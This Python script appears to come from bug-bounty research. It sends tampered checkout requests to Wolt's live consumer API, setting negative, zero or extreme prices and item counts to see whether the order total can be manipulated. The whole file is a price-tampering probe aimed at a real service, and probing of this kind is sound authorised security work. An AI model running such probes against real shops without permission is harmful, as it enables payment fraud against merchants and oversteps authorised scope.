"""Quick retest: negative price edge cases with correct body."""
import requests

H = {
    'User-Agent': 'Mozilla/5.0',
    'Origin': 'https://wolt.com',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
}
VENUE_ID = '60ebeb71c6904c2caf035f71'
FAKE_ITEM_ID = '670fa3e9ead6e49d65cc3614'

def try_checkout(label, item_overrides=None, root_overrides=None, purchase_overrides=None):
    item = {'id': FAKE_ITEM_ID, 'name': 'Test', 'count': 1,
            'price': 100, 'base_price': 100, 'end_amount': 100,
            'options': [], 'restrictions': [], 'category_id': '', 'exclude_from_discounts': False}
    if item_overrides:
        item.update(item_overrides)

    body = {
        'items': [item], 'base_price': item['base_price'], 'end_amount': item['end_amount'],
        'supplier_id': VENUE_ID, 'selected_delivery_method': 'homedelivery',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'currency': 'EUR', 'vendor': 'wolt', 'discount': 0, 'surcharges': [],
        'basket_id': f'negtest-{label}', 'pickup': False, 'scheduled_time': None,
        'shipping_method': 'homedelivery', 'discount_code': None,
        'purchase_plan': {
            'venue': {'id': VENUE_ID, 'country': 'FIN', 'currency': 'EUR'},
            'delivery_method': 'homedelivery',
            'menu_items': [dict(item)]
        }
    }
    if root_overrides:
        body.update(root_overrides)
        # Also sync to purchase_plan items
        for k in ['base_price', 'end_amount']:
            if k in root_overrides:
                body['purchase_plan']['menu_items'][0][k] = root_overrides[k]
    if purchase_overrides:
        body['purchase_plan']['menu_items'][0].update(purchase_overrides)
        # Also sync root
        for k in ['price', 'base_price', 'end_amount']:
            if k in purchase_overrides:
                body[k] = purchase_overrides[k]
                body['items'][0][k] = purchase_overrides[k]

    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout', headers=H, json=body)
    if r.status_code == 200:
        d = r.json()
        return f"200 | payable={d.get('payable_amount')}"
    elif r.status_code == 400:
        err = r.json() if 'json' in r.headers.get('content-type','') else r.text
        return f"400 | {str(err)[:180]}"
    else:
        return f"{r.status_code}"

print("=== NEGATIVE/ZERO EDGE CASES ===\n")

tests = [
    ("baseline 100 cent", {}, {}, {}),
    ("price=0 all fields", {'price': 0, 'base_price': 0, 'end_amount': 0}, {}, {}),
    ("price=-1 all fields", {'price': -1, 'base_price': -1, 'end_amount': -1}, {}, {}),
    ("end_amount=-100 only", {}, {'end_amount': -100}, {'end_amount': -100}),
    ("count=-1", {'count': -1}, {}, {}),
    ("count=0", {'count': 0}, {}, {}),
    ("count=999999", {'count': 999999}, {}, {}),
]
for label, io, ro, po in tests:
    r = try_checkout(label, io, ro, po)
    print(f"  [{label:30s}] {r}")

print("\nDONE")
